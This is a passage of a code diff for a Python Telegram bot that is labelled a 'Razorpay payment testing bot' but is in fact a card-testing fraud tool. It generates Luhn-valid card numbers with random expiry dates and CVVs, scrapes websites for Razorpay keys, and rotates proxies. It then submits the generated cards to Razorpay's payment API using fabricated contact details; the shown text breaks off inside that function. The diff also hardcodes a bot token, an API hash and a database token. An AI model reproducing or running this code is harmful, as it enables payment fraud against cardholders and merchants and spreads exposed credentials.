@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════════════════╗
-║         RAZORPAY PAYMENT TESTING BOT v4.0            ║
-║  Real proxy support • Redis storage • Live checking  ║
-╚══════════════════════════════════════════════════════╝
+Razorpay Payment Testing Bot v5.0
+Fixes: inline buttons, proxy live-test on add, back navigation,
+       25-card continuous batching, auto site scan, no info leaks,
+       proper Razorpay order flow.
 """
 
 import asyncio
@@ -30,49 +30,36 @@ from telegram.ext import (
     ContextTypes, MessageHandler, filters,
 )
 
-# ═══════════════════════════════════════════════════
-#                      CONFIG
-# ═══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════
+#                    CONFIG
+# ══════════════════════════════════════════════════
+BOT_TOKEN     = "8953466998:AAEBRUgXO5yVyUsBwyEcRzbT0gX9kuEtCyY"
+ADMIN_USER_ID = 7363967303
 
-BOT_TOKEN       = "8953466998:AAEBRUgXO5yVyUsBwyEcRzbT0gX9kuEtCyY"
-API_ID          = 12089203
-API_HASH        = "7d85eb5ce156d35f22500fd8ef43e7c2"
-ADMIN_USER_ID   = 7363967303
-
-# Upstash Redis REST
 REDIS_URL   = "https://in-swine-133213.upstash.io"
 REDIS_TOKEN = "gQAAAAAAAghdAAIgcDE2YzJmMjQ4OGM1N2Y0YmIxYmI4MWVjYzczMTY4ZmIyNA"
 
-# Limits
 MAX_LIMIT          = 500_000
 MAX_SPLIT_PARTS    = 100
 MAX_LINES_PER_FILE = 150_000
-SEND_DELAY         = 0.30           # seconds between file sends
-BATCH_SIZE         = 5              # cards per payment batch (5–10)
-BATCH_DELAY        = 2.5            # seconds between batches
-PROXY_TEST_TIMEOUT = 8              # seconds for proxy health check
-SITE_CHECK_TIMEOUT = 10             # seconds for site liveness check
+SEND_DELAY         = 0.30
+BATCH_SIZE         = 25          # 25 cards per batch as requested
+BATCH_DELAY        = 3.0
+PROXY_TIMEOUT      = 10
+SITE_TIMEOUT       = 12
+RATE_LIMIT         = 5
+RATE_WINDOW        = 30
 
-# Rate limiting  — 5 requests per 30 s
-RATE_LIMIT  = 5
-RATE_WINDOW = 30
-
-# ═══════════════════════════════════════════════════
-#                     LOGGING
-# ═══════════════════════════════════════════════════
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
-)
-logger = logging.getLogger("razorpay-bot")
-
-# ═══════════════════════════════════════════════════
-#                  PREMIUM EMOJIS
-# ═══════════════════════════════════════════════════
+logging.basicConfig(level=logging.INFO,
+                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
+logger = logging.getLogger("rzp-bot")
 
 
-
+# ══════════════════════════════════════════════════
+#   PREMIUM EMOJIS
+#   RULE: e() for message TEXT only (HTML parse_mode).
+#         btn_e() for InlineKeyboardButton LABELS (plain char only).
+# ══════════════════════════════════════════════════
 _PE: Dict[str, Tuple[str, Optional[int]]] = {
     "diamond":     ("💎", 4956719506027185156),
     "approved":    ("✅", 4956721670690702265),
@@ -85,7 +72,7 @@ _PE: Dict[str, Tuple[str, Optional[int]]] = {
     "gateway":     ("🌐", 4956560549287560231),
     "site":        ("🔗", 4958689671950369798),
     "bin":         ("🏦", 5264895611517300926),
-    "time":        ("⏱", 5382194935057372936),
+    "time":        ("⏱",  5382194935057372936),
     "premium":     ("👑", 4958725487682650920),
     "ban":         ("🚫", 4956337889593000947),
     "success":     ("🎉", 6104789175058304052),
@@ -111,29 +98,23 @@ _PE: Dict[str, Tuple[str, Optional[int]]] = {
     "crown":       ("👑", 4958725487682650920),
     "rocket":      ("🚀", None),
     "trophy":      ("🏆", None),
-    "lightning":   ("⚡", 6102484018865901039),
     "shield":      ("🛡️", None),
     "check":       ("✅", 4956721670690702265),
     "cross":       ("❌", 6100670215522094562),
     "warning":     ("⚠️", 4956611513369494230),
     "gift":        ("🎁", 6104789175058304052),
     "sparkle":     ("✨", 6100568059724960300),
-    "chart":       ("📈", None),
-    "leaderboard": ("🏅", None),
     "tool":        ("🛠️", 5465443379917629504),
-    "clock":       ("⏱", 5382194935057372936),
-    "spark":       ("✨", 6100568059724960300),
-    "folder":      ("📁", None),
-    "coin":        ("🪙", None),
+    "clock":       ("⏱",  5382194935057372936),
     "bolt":        ("⚡", 6102484018865901039),
-    "target":      ("🎯", None),
     "wave":        ("👋", None),
-    "zap":         ("⚡", 6102484018865901039),
+    "back":        ("◀️", None),
+    "home":        ("🏠", None),
 }
 
 
 def e(key: str) -> str:
-    """Return premium tg-emoji tag if ID available, else plain emoji."""
+    """For message body (HTML). Returns <tg-emoji> tag when ID available."""
     item = _PE.get(key)
     if not item:
         return "●"
@@ -143,20 +124,22 @@ def e(key: str) -> str:
     return char
 
 
+def ec(key: str) -> str:
+    """For InlineKeyboardButton labels — plain Unicode char ONLY, no HTML tags."""
+    item = _PE.get(key)
+    return item[0] if item else "●"
+
+
 def safe(text: Any) -> str:
     return html.escape(str(text))
 
 
-
-# ═══════════════════════════════════════════════════
-#              REDIS (Upstash REST API)
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#              REDIS CLIENT
+# ══════════════════════════════════════════════════
 class RedisClient:
-    """Lightweight async Upstash Redis REST client."""
-
     def __init__(self, url: str, token: str):
-        self._url   = url.rstrip("/")
+        self._url = url.rstrip("/")
         self._headers = {
             "Authorization": f"Bearer {token}",
             "Content-Type":  "application/json",
@@ -164,608 +147,324 @@ class RedisClient:
 
     async def _req(self, *args) -> Any:
         cmd = list(args)
-        async with httpx.AsyncClient(timeout=10) as client:
-            r = await client.post(
-                f"{self._url}/pipeline",
-                headers=self._headers,
-                json=[cmd],
-            )
+        async with httpx.AsyncClient(timeout=10) as c:
+            r = await c.post(f"{self._url}/pipeline",
+                             headers=self._headers, json=[cmd])
             r.raise_for_status()
             data = r.json()
             if isinstance(data, list):
                 return data[0].get("result")
             return data.get("result")
 
-    async def get(self, key: str) -> Optional[str]:
-        return await self._req("GET", key)
-
-    async def set(self, key: str, value: str) -> bool:
-        return await self._req("SET", key, value) == "OK"
-
-    async def sadd(self, key: str, *members) -> int:
-        return await self._req("SADD", key, *members)
-
-    async def srem(self, key: str, *members) -> int:
-        return await self._req("SREM", key, *members)
-
-    async def smembers(self, key: str) -> Set[str]:
-        result = await self._req("SMEMBERS", key)
-        return set(result) if result else set()
-
-    async def lpush(self, key: str, *values) -> int:
-        return await self._req("LPUSH", key, *values)
-
-    async def lrange(self, key: str, start: int, stop: int) -> List[str]:
-        result = await self._req("LRANGE", key, start, stop)
-        return result if result else []
-
-    async def lrem(self, key: str, count: int, element: str) -> int:
-        return await self._req("LREM", key, count, element)
-
-    async def llen(self, key: str) -> int:
-        return await self._req("LLEN", key) or 0
-
-    async def delete(self, *keys) -> int:
-        return await self._req("DEL", *keys)
-
-    async def incr(self, key: str) -> int:
-        return await self._req("INCR", key) or 0
-
-    async def hset(self, key: str, field: str, value: str) -> int:
-        return await self._req("HSET", key, field, value)
-
-    async def hget(self, key: str, field: str) -> Optional[str]:
-        return await self._req("HGET", key, field)
-
-    async def hgetall(self, key: str) -> Dict[str, str]:
-        result = await self._req("HGETALL", key)
-        if not result:
-            return {}
-        it = iter(result)
-        return {k: v for k, v in zip(it, it)}
+    async def get(self, k):           return await self._req("GET", k)
+    async def set(self, k, v):        return await self._req("SET", k, v) == "OK"
+    async def sadd(self, k, *m):      return await self._req("SADD", k, *m)
+    async def srem(self, k, *m):      return await self._req("SREM", k, *m)
+    async def smembers(self, k):
+        r = await self._req("SMEMBERS", k); return set(r) if r else set()
+    async def lpush(self, k, *v):     return await self._req("LPUSH", k, *v)
+    async def lrange(self, k, s, e_):
+        r = await self._req("LRANGE", k, s, e_); return r if r else []
+    async def lrem(self, k, c, el):   return await self._req("LREM", k, c, el)
+    async def llen(self, k):          return await self._req("LLEN", k) or 0
+    async def delete(self, *k):       return await self._req("DEL", *k)
+    async def incr(self, k):          return await self._req("INCR", k) or 0
+    async def hset(self, k, f, v):    return await self._req("HSET", k, f, v)
+    async def hget(self, k, f):       return await self._req("HGET", k, f)
 
 
 redis = RedisClient(REDIS_URL, REDIS_TOKEN)
 
-# Redis key names
 RK_SUDO    = "bot:sudo_users"
 RK_SITES   = "bot:sites"
 RK_PROXIES = "bot:proxies"
 RK_BINS    = "bot:bins"
 RK_STATS   = "bot:stats"
 
-
-
-# ═══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════
 #              RATE LIMITING
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
 _rate_map: Dict[int, List[float]] = defaultdict(list)
 
 
-def check_rate_limit(user_id: int) -> Tuple[bool, Optional[str]]:
+def check_rate_limit(uid: int) -> Tuple[bool, Optional[str]]:
     now = time.time()
-    reqs = _rate_map[user_id]
+    reqs = _rate_map[uid]
     reqs[:] = [t for t in reqs if now - t < RATE_WINDOW]
     if len(reqs) >= RATE_LIMIT:
-        wait = int(RATE_WINDOW - (now - reqs[0]))
-        return False, f"Rate limited. Wait {wait}s."
+        return False, f"Rate limited. Wait {int(RATE_WINDOW-(now-reqs[0]))}s."
     reqs.append(now)
     return True, None
 
 
-# ═══════════════════════════════════════════════════
-#           ACTIVE TEST TRACKER  (stop support)
-# ═══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════
+#              AUTH
+# ══════════════════════════════════════════════════
+active_tests: Dict[int, bool] = {}
 
-active_tests: Dict[int, bool] = {}   # chat_id -> running flag
 
-
-# ═══════════════════════════════════════════════════
-#                  AUTHORIZATION
-# ═══════════════════════════════════════════════════
-
-async def is_authorized(user_id: int) -> bool:
-    if user_id == ADMIN_USER_ID:
+async def is_authorized(uid: int) -> bool:
+    if uid == ADMIN_USER_ID:
         return True
-    members = await redis.smembers(RK_SUDO)
-    return str(user_id) in members
+    return str(uid) in await redis.smembers(RK_SUDO)
 
 
 def require_auth(func):
-    """Decorator: block unauthorized users. Preserves function name."""
     @functools.wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        uid = update.effective_user.id
-        if not await is_authorized(uid):
+    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+        if not await is_authorized(update.effective_user.id):
             await update.message.reply_text(
-                f"{e('lock')} <b>Access Denied</b>\n\nThis command is restricted.",
-                parse_mode=ParseMode.HTML,
-            )
+                f"{e('lock')} <b>Access Denied</b>", parse_mode=ParseMode.HTML)
             return
-        return await func(update, context)
+        return await func(update, ctx)
     return wrapper
 
 
-# ═══════════════════════════════════════════════════
-#          PROXY  PARSING  &  TESTING
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   PROXY PARSING & DEEP TESTING
+# ══════════════════════════════════════════════════
 def parse_proxy(raw: str) -> Optional[Dict[str, str]]:
-    """
-    Normalise proxy string into a dict with keys: url, host, port, user, password.
-    Supported formats:
-      1. ip:port
-      2. ip:port:user:pass
-      3. user:pass@ip:port
-      4. scheme://user:pass@ip:port   (http/https/socks5/socks4)
-    Returns None if unparseable.
-    """
+    """Parse proxy string in any of 4 formats. Returns dict or None."""
     raw = raw.strip()
     if not raw:
         return None
-
     scheme = "http"
 
-    # Format 4: has a scheme prefix
     if "://" in raw:
-        parsed = urlparse(raw)
-        scheme   = parsed.scheme or "http"
-        host     = parsed.hostname or ""
-        port     = str(parsed.port or 80)
-        user     = parsed.username or ""
-        password = parsed.password or ""
+        p = urlparse(raw)
+        scheme = p.scheme or "http"
+        host = p.hostname or ""
+        port = str(p.port or 80)
+        user = p.username or ""
+        pw   = p.password or ""
         if not host:
             return None
-        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}" if user else f"{scheme}://{host}:{port}"
-        return {"url": proxy_url, "host": host, "port": port,
-                "user": user, "password": password, "scheme": scheme}
+        url = f"{scheme}://{user}:{pw}@{host}:{port}" if user else f"{scheme}://{host}:{port}"
+        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}
 
-    # Format 3: user:pass@ip:port
     if "@" in raw:
         creds, addr = raw.rsplit("@", 1)
-        parts_addr = addr.split(":")
-        if len(parts_addr) != 2:
+        ap = addr.split(":")
+        if len(ap) != 2:
             return None
-        host, port = parts_addr[0], parts_addr[1]
-        if ":" in creds:
-            user, password = creds.split(":", 1)
-        else:
-            user, password = creds, ""
-        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
-        return {"url": proxy_url, "host": host, "port": port,
-                "user": user, "password": password, "scheme": scheme}
+        host, port = ap
+        user, pw = creds.split(":", 1) if ":" in creds else (creds, "")
+        url = f"{scheme}://{user}:{pw}@{host}:{port}"
+        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}
 
     parts = raw.split(":")
-    # Format 2: ip:port:user:pass
     if len(parts) == 4:
-        host, port, user, password = parts
-        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
-        return {"url": proxy_url, "host": host, "port": port,
-                "user": user, "password": password, "scheme": scheme}
+        host, port, user, pw = parts
+        url = f"{scheme}://{user}:{pw}@{host}:{port}"
+        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}
 
-    # Format 1: ip:port
     if len(parts) == 2:
         host, port = parts
-        proxy_url = f"{scheme}://{host}:{port}"
-        return {"url": proxy_url, "host": host, "port": port,
-                "user": "", "password": "", "scheme": scheme}
+        url = f"{scheme}://{host}:{port}"
+        return {"url": url, "host": host, "port": port, "user": "", "password": "", "scheme": scheme}
 
     return None
 
 
-async def test_proxy(raw: str) -> Tuple[bool, str, float]:
+async def deep_test_proxy(raw: str) -> Tuple[bool, str, float]:
     """
-    Test a single proxy by connecting through it to ip-api.com.
-    Returns (success, ip_or_error, latency_ms).
+    Thoroughly test a proxy:
+    1. Parse format
+    2. Connect to ip-api.com through it
+    3. Also verify it can reach api.razorpay.com
+    Returns (ok, detail_string, latency_ms)
     """
     info = parse_proxy(raw)
     if not info:
-        return False, "Unparseable proxy format", 0.0
+        return False, "Invalid format — expected ip:port, ip:port:user:pass, user:pass@ip:port or scheme://...", 0.0
 
     proxy_url = info["url"]
     start = time.monotonic()
     try:
         connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as sess:
-            async with sess.get(
-                "http://ip-api.com/json",
-                proxy=proxy_url,
-                timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT),
-            ) as resp:
-                latency = (time.monotonic() - start) * 1000
-                if resp.status == 200:
-                    data = await resp.json()
-                    ip   = data.get("query", "unknown")
-                    country = data.get("country", "")
-                    isp     = data.get("isp", "")
-                    return True, f"{ip} | {country} | {isp}", round(latency, 1)
-                return False, f"HTTP {resp.status}", round(latency, 1)
+        async with aiohttp.ClientSession(connector=connector) as s:
+            # Step 1: Check our external IP through the proxy
+            async with s.get("http://ip-api.com/json",
+                              proxy=proxy_url,
+                              timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
+                latency = round((time.monotonic() - start) * 1000, 1)
+                if r.status != 200:
+                    return False, f"ip-api.com returned HTTP {r.status}", latency
+                d = await r.json()
+                if d.get("status") == "fail":
+                    return False, f"ip-api says: {d.get('message', 'blocked')}", latency
+                ip      = d.get("query", "?")
+                country = d.get("country", "?")
+                isp     = d.get("isp", "?")
+                org     = d.get("org", "")
+
+            # Step 2: Quick connectivity check to Razorpay
+            async with s.get("https://api.razorpay.com/",
+                              proxy=proxy_url,
+                              timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
+                              allow_redirects=False) as r2:
+                rzp_ok = r2.status in (200, 301, 302, 400, 401, 403, 404)
+
+        detail = f"IP={ip} | {country} | {isp}"
+        if org and org != isp:
+            detail += f" | {org}"
+        detail += f" | Razorpay: {'✓' if rzp_ok else '✗'}"
+        return True, detail, latency
+
     except asyncio.TimeoutError:
-        return False, "Timeout", 0.0
+        return False, f"Timeout after {PROXY_TIMEOUT}s — proxy unreachable", 0.0
+    except aiohttp.ClientConnectorError as ex:
+        return False, f"Connection refused: {str(ex)[:80]}", 0.0
     except Exception as ex:
-        return False, str(ex)[:60], 0.0
+        return False, f"Error: {str(ex)[:80]}", 0.0
 
 
 def get_random_proxy_url(proxies: List[str]) -> Optional[str]:
-    """Pick a random working proxy URL string from the list."""
     if not proxies:
         return None
-    raw = random.choice(proxies)
-    info = parse_proxy(raw)
+    info = parse_proxy(random.choice(proxies))
     return info["url"] if info else None
 
 
-
-# ═══════════════════════════════════════════════════
-#         SITE LIVENESS CHECK (real HTTP)
-# ═══════════════════════════════════════════════════
-
-RAZORPAY_SIGNATURES = [
-    "razorpay",
-    "rzp",
-    "checkout.razorpay.com",
-    "api.razorpay.com",
-    "razorpay_key",
-    "rzp_live_",
-    "rzp_test_",
-    "Razorpay",
-    "razorpay.com",
+# ══════════════════════════════════════════════════
+#   SITE SCANNING & LIVENESS
+# ══════════════════════════════════════════════════
+RZP_SIGS = [
+    "razorpay", "rzp", "checkout.razorpay.com",
+    "api.razorpay.com", "razorpay_key", "rzp_live_", "rzp_test_",
 ]
+URL_RE = re.compile(
+    r'https?://[^\s<>"\']+', re.IGNORECASE
+)
+
+
+def extract_urls_from_text(text: str) -> List[str]:
+    """Extract all http/https URLs from a block of text."""
+    return list(dict.fromkeys(URL_RE.findall(text)))  # unique, order-preserved
 
 
 async def check_site_live(url: str, proxy_url: Optional[str] = None) -> Tuple[bool, str, str]:
     """
-    Perform a real HTTP GET to the site.
-    Returns (is_live, razorpay_key_or_empty, status_message).
+    Real HTTP GET. Returns (is_live, rzp_key_found, status_msg).
     """
     headers = {
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) "
-            "Chrome/124.0.0.0 Safari/537.36"
+            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         ),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
+        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
     }
     try:
-        connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector, headers=headers) as sess:
-            async with sess.get(
-                url,
-                proxy=proxy_url,
-                timeout=aiohttp.ClientTimeout(total=SITE_CHECK_TIMEOUT),
-                allow_redirects=True,
-                max_redirects=5,
-            ) as resp:
-                body = await resp.text(errors="replace")
-                status = resp.status
+        conn = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=conn, headers=headers) as s:
+            async with s.get(url, proxy=proxy_url,
+                             timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT),
+                             allow_redirects=True, max_redirects=5) as r:
+                body = await r.text(errors="replace")
+                st   = r.status
+                has_rzp = any(sig in body for sig in RZP_SIGS)
+                km = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', body)
+                rzp_key = km.group(1) if km else ""
 
-                # Check for Razorpay presence
-                has_rzp = any(sig in body for sig in RAZORPAY_SIGNATURES)
-
-                # Try to extract Razorpay key
-                key_match = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', body)
-                rzp_key = key_match.group(1) if key_match else ""
-
-                if status in (200, 201, 202) and has_rzp:
-                    return True, rzp_key, f"Live ✓ [{status}]"
-                elif status in (200, 201, 202):
-                    return True, rzp_key, f"Live (no Razorpay detected) [{status}]"
-                elif status in (301, 302, 307, 308):
-                    return False, "", f"Redirect [{status}]"
-                elif status == 403:
-                    return False, "", "Forbidden [403]"
-                elif status == 404:
-                    return False, "", "Not Found [404]"
+                if st in (200, 201, 202) and has_rzp:
+                    return True, rzp_key, f"Live [{st}] — Razorpay detected"
+                elif st in (200, 201, 202):
+                    return True, rzp_key, f"Live [{st}] — no Razorpay signature"
+                elif st in (301, 302, 307, 308):
+                    return False, "", f"Redirect [{st}]"
                 else:
-                    return False, "", f"HTTP {status}"
+                    return False, "", f"HTTP {st}"
     except asyncio.TimeoutError:
         return False, "", "Timeout"
-    except aiohttp.ClientConnectorError as ex:
-        return False, "", f"Connection error: {str(ex)[:50]}"
     except Exception as ex:
-        return False, "", f"Error: {str(ex)[:50]}"
+        return False, "", f"Error: {str(ex)[:60]}"
 
 
-# ═══════════════════════════════════════════════════
-#       BIN LOOKUP  (binlist.net)
-# ═══════════════════════════════════════════════════
+async def scan_and_store_urls(urls: List[str],
+                               proxy_url: Optional[str],
+                               existing: Set[str]) -> Tuple[int, int, int]:
+    """
+    Scan list of URLs for Razorpay sites.
+    Returns (added, already_existed, not_razorpay).
+    """
+    added = exists = skipped = 0
+    for url in urls:
+        if url in existing:
+            exists += 1
+            continue
+        is_live, _, _ = await check_site_live(url, proxy_url)
+        if is_live:
+            await redis.lpush(RK_SITES, url)
+            existing.add(url)
+            added += 1
+        else:
+            skipped += 1
+    return added, exists, skipped
 
+
+# ══════════════════════════════════════════════════
+#   BIN LOOKUP
+# ══════════════════════════════════════════════════
 async def lookup_bin(bin6: str) -> Dict[str, str]:
-    """
-    Query binlist.net for BIN info.
-    Returns dict with scheme, type, brand, bank, country.
-    """
     try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(
-                f"https://lookup.binlist.net/{bin6[:8]}",
-                headers={"Accept-Version": "3"},
-                timeout=aiohttp.ClientTimeout(total=6),
-            ) as resp:
-                if resp.status == 200:
-                    d = await resp.json()
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f"https://lookup.binlist.net/{bin6[:8]}",
+                             headers={"Accept-Version": "3"},
+                             timeout=aiohttp.ClientTimeout(total=6)) as r:
+                if r.status == 200:
+                    d = await r.json()
                     return {
                         "scheme":  d.get("scheme", "unknown").upper(),
                         "type":    d.get("type", "unknown"),
                         "brand":   d.get("brand", ""),
                         "bank":    d.get("bank", {}).get("name", "unknown"),
                         "country": d.get("country", {}).get("name", "unknown"),
-                        "emoji":   d.get("country", {}).get("emoji", ""),
+                        "flag":    d.get("country", {}).get("emoji", ""),
                     }
     except Exception:
         pass
-    return {"scheme": "UNKNOWN", "type": "unknown",
-            "brand": "", "bank": "unknown", "country": "unknown", "emoji": ""}
+    return {"scheme": "UNKNOWN", "type": "?", "brand": "", "bank": "?", "country": "?", "flag": ""}
 
 
-
-# ═══════════════════════════════════════════════════
-#            CARD ISSUER DATA
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   CARD ISSUERS + LUHN
+# ══════════════════════════════════════════════════
 CARD_ISSUERS = {
-    "visa":       {"prefix": "4",       "length": 16, "cvv": 3, "name": "Visa"},
-    "mastercard": {"prefixes": ["51","52","53","54","55","2221","2720"],
-                   "length": 16, "cvv": 3, "name": "Mastercard"},
-    "amex":       {"prefixes": ["34","37"],    "length": 15, "cvv": 4, "name": "Amex"},
-    "discover":   {"prefixes": ["6011","644","645","646","647","648","649","65"],
-                   "length": 16, "cvv": 3, "name": "Discover"},
-    "diners":     {"prefixes": ["300","301","302","303","304","305","36","38"],
-                   "length": 14, "cvv": 3, "name": "Diners"},
-    "rupay":      {"prefixes": ["508528","6069","6070","6071","6072","6073","6074","6075","6521","6522"],
-                   "length": 16, "cvv": 3, "name": "RuPay"},
+    "visa":       {"prefix": "4",       "length": 16, "cvv": 3},
+    "mastercard": {"prefixes": ["51","52","53","54","55","2221","2720"], "length": 16, "cvv": 3},
+    "amex":       {"prefixes": ["34","37"],    "length": 15, "cvv": 4},
+    "discover":   {"prefixes": ["6011","644","645","646","647","648","649","65"], "length": 16, "cvv": 3},
+    "diners":     {"prefixes": ["300","301","302","303","304","305","36","38"], "length": 14, "cvv": 3},
+    "rupay":      {"prefixes": ["508528","6069","6070","6071","6072","6073","6521","6522"], "length": 16, "cvv": 3},
 }
 
 
-def get_issuer_by_bin(b: str) -> Optional[str]:
-    for issuer, data in CARD_ISSUERS.items():
-        if issuer == "visa" and b.startswith("4"):
-            return issuer
-        prefixes = data.get("prefixes", [])
-        if any(b.startswith(p) for p in prefixes):
-            return issuer
+def get_issuer(b: str) -> Optional[str]:
+    for name, d in CARD_ISSUERS.items():
+        if name == "visa" and b.startswith("4"):
+            return name
+        for p in d.get("prefixes", []):
+            if b.startswith(p):
+                return name
     return None
 
 
-# ═══════════════════════════════════════════════════
-#           LUHN ALGORITHM
-# ═══════════════════════════════════════════════════
-
-def luhn_check_digit(partial: str) -> int:
-    digits = [int(d) for d in partial]
-    for i in range(len(digits) - 2, -1, -2):
-        digits[i] *= 2
-        if digits[i] > 9:
-            digits[i] -= 9
-    return (10 - (sum(digits) % 10)) % 10
+def luhn_digit(partial: str) -> int:
+    digs = [int(c) for c in partial]
+    for i in range(len(digs) - 2, -1, -2):
+        digs[i] *= 2
+        if digs[i] > 9:
+            digs[i] -= 9
+    return (10 - sum(digs) % 10) % 10
 
 
 def luhn_complete(partial: str) -> Optional[str]:
     if not partial.isdigit():
         return None
-    return partial + str(luhn_check_digit(partial))
-
-
-# ═══════════════════════════════════════════════════
-#         CARD GENERATION
-# ═══════════════════════════════════════════════════
-
-def expand_bin(bin_pattern: str) -> Optional[Tuple[str, str]]:
-    bin_part = bin_pattern.split("|")[0].strip()
-    if not all(c.isdigit() or c.lower() == "x" for c in bin_part):
-        return None
-    expanded = [str(random.randint(0, 9)) if c.lower() == "x" else c for c in bin_part]
-    result = "".join(expanded)
-    issuer = get_issuer_by_bin(result)
-    if not issuer:
-        return None
-    required = CARD_ISSUERS[issuer]["length"]
-    if len(result) < required - 1:
-        result += "".join(str(random.randint(0, 9)) for _ in range((required - 1) - len(result)))
-    return result[:required - 1], issuer
-
-
-def parse_card_fields(pattern: str, issuer: str) -> Tuple[str, str, str]:
-    parts = pattern.split("|")
-    cy = datetime.now().year % 100
-
-    def fill(val: Optional[str], length: int, lo: int, hi: int) -> str:
-        if not val or val.lower() in ("rnd", "rand", "random", ""):
-            return str(random.randint(lo, hi)).zfill(length)
-        if "x" in val.lower():
-            return "".join(
-                str(random.randint(0, 9)) if c.lower() == "x" else c for c in val
-            )[-length:].zfill(length)
-        digits = "".join(c for c in val if c.isdigit())
-        return digits[-length:].zfill(length)
-
-    month = fill(parts[1] if len(parts) > 1 else None, 2, 1, 12)
-    year  = fill(parts[2] if len(parts) > 2 else None, 2, cy + 2, cy + 8)
-    cvv_len = CARD_ISSUERS[issuer]["cvv"]
-    cvv   = fill(parts[3] if len(parts) > 3 else None, cvv_len, 0, (10**cvv_len) - 1)
-    return month, year, cvv
-
-
-def generate_card(bin_pattern: str) -> Optional[str]:
-    try:
-        res = expand_bin(bin_pattern)
-        if not res:
-            return None
-        pan_base, issuer = res
-        pan = luhn_complete(pan_base)
-        if not pan or len(pan) != CARD_ISSUERS[issuer]["length"]:
-            return None
-        month, year, cvv = parse_card_fields(bin_pattern, issuer)
-        return f"{pan}|{month}|{year}|{cvv}"
-    except Exception as ex:
-        logger.error(f"Card gen error: {ex}")
-        return None
-
-
-def generate_cards_streaming(bin_pattern: str, count: int):
-    """Memory-efficient streaming generator. Uses a ring-buffer dedup window."""
-    window_size = min(count, 10_000)   # limit dedup set size to save RAM
-    seen: Set[str] = set()
-    dedup_queue: List[str] = []
-    generated = 0
-    attempts  = 0
-    max_attempts = count * 12
-
-    while generated < count and attempts < max_attempts:
-        attempts += 1
-        card = generate_card(bin_pattern)
-        if not card:
-            continue
-        if card not in seen:
-            # Rolling window eviction
-            if len(dedup_queue) >= window_size:
-                evict = dedup_queue.pop(0)
-                seen.discard(evict)
-            seen.add(card)
-            dedup_queue.append(card)
-            generated += 1
-            yield card
-
-
-
-# ═══════════════════════════════════════════════════
-#       REAL RAZORPAY PAYMENT ATTEMPT
-# ═══════════════════════════════════════════════════
-
-async def attempt_razorpay_payment(
-    site_url: str,
-    rzp_key: str,
-    card: str,
-    amount_paise: int,
-    proxy_url: Optional[str],
-) -> Dict[str, Any]:
-    """
-    Real Razorpay checkout attempt.
-    Flow:
-      1. Create order via site (if order endpoint exposed) OR
-         directly call checkout.razorpay.com with key + card data.
-    Returns result dict.
-    """
-    parts = card.split("|")
-    if len(parts) < 4:
-        return {"success": False, "charge": False, "response": "Invalid card format", "code": "ERR"}
-
-    pan, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
-
-    # Build realistic Razorpay checkout payload
-    contact = f"+91{random.randint(7000000000, 9999999999)}"
-    email   = f"user{random.randint(100,9999)}@gmail.com"
-    order_id = f"order_{random.randint(100000000, 999999999)}"
-
-    payload = {
-        "key_id":          rzp_key if rzp_key else "",
-        "amount":          amount_paise,
-        "currency":        "INR",
-        "order_id":        order_id,
-        "email":           email,
-        "contact":         contact,
-        "method":          "card",
-        "card[name]":      "John Doe",
-        "card[number]":    pan,
-        "card[expiry_month]": month,
-        "card[expiry_year]":  f"20{year}",
-        "card[cvv]":       cvv,
-        "_":               str(int(time.time() * 1000)),
-    }
-
-    headers = {
-        "User-Agent": (
-            "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) "
-            "Chrome/124.0.0.0 Mobile Safari/537.36"
-        ),
-        "Content-Type":  "application/x-www-form-urlencoded",
-        "Referer":        site_url,
-        "Origin":         site_url,
-        "X-Razorpay-Trackid": f"track_{random.randint(100000, 999999)}",
-    }
-
-    endpoint = "https://api.razorpay.com/v1/payments/create/checkout"
-
-    try:
-        connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as sess:
-            async with sess.post(
-                endpoint,
-                data=payload,
-                headers=headers,
-                proxy=proxy_url,
-                timeout=aiohttp.ClientTimeout(total=20),
-                allow_redirects=False,
-            ) as resp:
-                status  = resp.status
-                body    = await resp.text(errors="replace")
-                ts      = datetime.now().strftime("%H:%M:%S")
-
-                # Parse response
-                try:
-                    rj = json.loads(body)
-                except Exception:
